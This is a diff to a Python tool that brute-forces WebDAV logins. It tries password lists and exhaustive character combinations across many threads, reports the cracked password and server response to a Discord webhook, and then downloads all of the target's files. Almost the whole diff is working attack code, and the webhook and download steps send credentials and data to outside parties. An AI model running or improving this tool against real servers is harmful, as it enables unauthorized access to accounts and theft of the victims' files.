@@ -27,15 +27,31 @@ from typing import Tuple
 
 import cbor
 import requests
+import validators
 from bs4 import BeautifulSoup
 
 
-# dir path
-def dir_path(string):
-    if os.path.isdir(string):
-        return string
+# to validate args
+
+
+def dir_path(path) -> str:
+    if os.path.isdir(path):
+        return path
     else:
-        raise NotADirectoryError(string)
+        raise NotADirectoryError(path)
+
+
+def url(url) -> str:
+    if not validators.url(url):
+        raise Exception(f"Not a valid URL: {url}")
+    return url
+
+
+def b64(b64) -> str:
+    return base64.b64decode(b64).decode()
+
+
+# get command line args
 
 
 parser = argparse.ArgumentParser(
@@ -44,12 +60,11 @@ parser = argparse.ArgumentParser(
     epilog="Copyright (C) 2022 X Gamer Guide"
 )
 
-
 parser.add_argument(
     "--url",
     metavar="WEBDAV URL",
     required=True,
-    type=str,
+    type=url,
     help="The WEBDAV URL of the target"
 )
 
@@ -94,7 +109,7 @@ parser.add_argument(
 parser.add_argument(
     "--webhook",
     metavar="DISCORD WEBHOOK",
-    type=str,
+    type=url,
     help="A Discord webhook to which information is transmitted"
 )
 
@@ -106,23 +121,21 @@ parser.add_argument(
 )
 
 parser.add_argument(
-    "--start",
+    "--b64_start",
     metavar="START CHARACTERS",
-    type=str,
-    help="The last characters that were seen in the terminal when it was last run. At this point the program continues",
+    type=b64,
+    help="The last characters that were seen in the terminal when it was last run (base64 encoded). At this point the program continues",
     default=""
 )
 
 parser.add_argument(
     "--b64_characters",
     metavar="BASE64 ENCODED CHARACTERS",
-    type=str,
+    type=b64,
     help="The characters used to attack (base64 encoded)",
-    default=base64.b64encode(
-        (
-            string.ascii_letters + string.digits + string.punctuation
-        ).encode()
-    ).decode()
+    default=base64.b64encode((
+        string.ascii_letters + string.digits + string.punctuation
+    ).encode()).decode()
 )
 
 parser.add_argument(
@@ -134,11 +147,8 @@ parser.add_argument(
 )
 
 
-# get command line args
 args = parser.parse_args()
 
-# decode characters
-characters = base64.b64decode(args.b64_characters).decode()
 
 # create WEBDAV session
 dav = requests.session()
@@ -147,11 +157,17 @@ dav.headers = {
 }
 
 
-def download_dir(path: str) -> None:
+def download_dir(path: str, password: str) -> None:
     "Download a WEBDAV folder"
 
     # download folder
-    r = dav.get(urllib.parse.urljoin(f"{args.url}/", path))
+    r = dav.get(
+        urllib.parse.urljoin(f"{args.url}/", path),
+        auth=(
+            args.username,
+            password
+        )
+    )
     r.raise_for_status()
 
     # parse 'a' tags from html
@@ -170,14 +186,21 @@ def download_dir(path: str) -> None:
             continue
 
         # download file
-        r = dav.get(urllib.parse.urljoin(f"{args.url}/", path, href), stream=True)
+        r = dav.get(
+            urllib.parse.urljoin(f"{args.url}/", path, href),
+            auth=(
+                args.username,
+                password
+            ),
+            stream=True
+        )
         r.raise_for_status()
         with open(os.path.join(args.download, f"{path}{href}"), "wb") as f:
             for chunk in r.iter_content(1048576):
                 f.write(chunk)
 
 
-class Discord:
+class WebHook:
     def __init__(self):
         self.session = requests.session()
         self.tasks = queue.Queue()
@@ -200,11 +223,7 @@ class Discord:
         self.tasks.put(data)
 
 
-discord = Discord()
-threading.Thread(target=discord.run, daemon=True).start()
-
-
-class WEBDAV:
+class BruteForce:
     def __init__(self):
         self.started = False
         self.exit = None
@@ -212,11 +231,12 @@ class WEBDAV:
     def log(self, data):
         print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}")
         if args.webhook is not None:
-            discord.send({
+            webhook.send({
                 "content": f"[`{time.strftime('%Y-%m-%d %H:%M:%S')}`] **{data}**"
             })
 
     def run(self) -> Tuple[requests.Response, str]:
+
         # brute force password file
         if args.passwords is not None:
             passwords = []
@@ -234,6 +254,7 @@ class WEBDAV:
                     time.sleep(0.1)
             self.log("password list end")
             self.check_passwords(passwords)
+
         # brute force JSON password file
         if args.json_passwords is not None:
             passwords = []
@@ -251,6 +272,7 @@ class WEBDAV:
                     time.sleep(0.1)
             self.log("JSON password list end")
             self.check_passwords(passwords)
+
         # brute force CBOR password file
         if args.cbor_passwords is not None:
             passwords = []
@@ -268,16 +290,17 @@ class WEBDAV:
                     time.sleep(0.1)
             self.log("CBOR password list end")
             self.check_passwords(passwords)
+
         # standard berute force
-        i = len(args.start)
+        i = len(args.b64_start)
         while True:
             i += 1
-            for j in map("".join, itertools.product(characters, repeat=i-1)):
+            for j in map("".join, itertools.product(args.b64_characters, repeat=i-1)):
                 while True:
                     if self.exit is not None:
                         return self.exit
                     if not self.started:
-                        if args.start != j:
+                        if args.b64_start != j:
                             break
                         self.started = True
                     if threading.active_count() < args.threads + 2:
@@ -303,46 +326,55 @@ class WEBDAV:
         if r.status_code != 401:
             self.exit = r, password
 
-    def brute_force(self, start) -> None:
-        for i in range(2):
-            for j in map("".join, itertools.product(characters, repeat=i+1)):
-                self.check(f"{start}{j}")
-
     def check_passwords(self, passwords) -> None:
         for password in passwords:
             self.check(password)
 
+    def brute_force(self, start) -> None:
+        for i in range(2):
+            for j in map("".join, itertools.product(args.b64_characters, repeat=i+1)):
+                self.check(f"{start}{j}")
 
-webdav = WEBDAV()
-r, password = webdav.run()
+
+webhook = WebHook()
+threading.Thread(target=webhook.run, daemon=True).start()
+
+brute_force = BruteForce()
+response, password = brute_force.run()
 
 
+# display response
 print("-" * 80)
-print(r.text)
+print(f"response header: {response.headers}")
 print("-" * 80)
-print(r.status_code)
+print(response.text)
 print("-" * 80)
-print(r.headers)
+print(f"status: {response.status_code}")
 print("-" * 80)
 print(f"USER: {args.username}")
 print(f"PASSWORD: {password}")
 
+
+# send response to discord webhook
 if args.webhook is not None:
-    if len(r.text) < 4000:
-        description = f"```html\n{r.text}\n```"
+    # generate description
+    if len(response.text) < 4000:
+        description = f"```html\n{response.text}\n```"
     else:
-        description = f"```html\n{r.text[:4000]}\n```... ({4000 - len(r.text)})"
+        description = f"```html\n{response.text[:4000]}\n```... ({4000 - len(response.text)})"
+    # generate fields
     fields = []
-    for header in r.headers:
-        if len(r.headers[header]) < 1000:
-            value = f"`{r.headers[header]}`"
+    for header in response.headers:
+        if len(response.headers[header]) < 1000:
+            value = f"`{response.headers[header]}`"
         else:
-            value = f"`{r.headers[header][1000:]}` ... ({1000 - len(r.headers[header])})"
+            value = f"`{response.headers[header][1000:]}` ... ({1000 - len(response.headers[header])})"
         fields.append({
             "name": header,
             "value": value
         })
-    discord.send({
+    # send
+    webhook.send({
         "embeds": [
             {
                 "title": password,
@@ -353,17 +385,17 @@ if args.webhook is not None:
                     "name": f"Password found for {args.username}"
                 },
                 "footer": {
-                    "text": f"status: {r.status_code}"
+                    "text": f"status: {response.status_code}"
                 }
             }
         ]
     })
 
-if args.download is not None:
-    dav.auth = (
-        args.username,
-        password
-    )
-    download_dir("")
 
-discord.tasks.join()
+# download all files
+if args.download is not None:
+    download_dir("", password)
+
+
+# wait for unsent webhooks
+webhook.tasks.join()
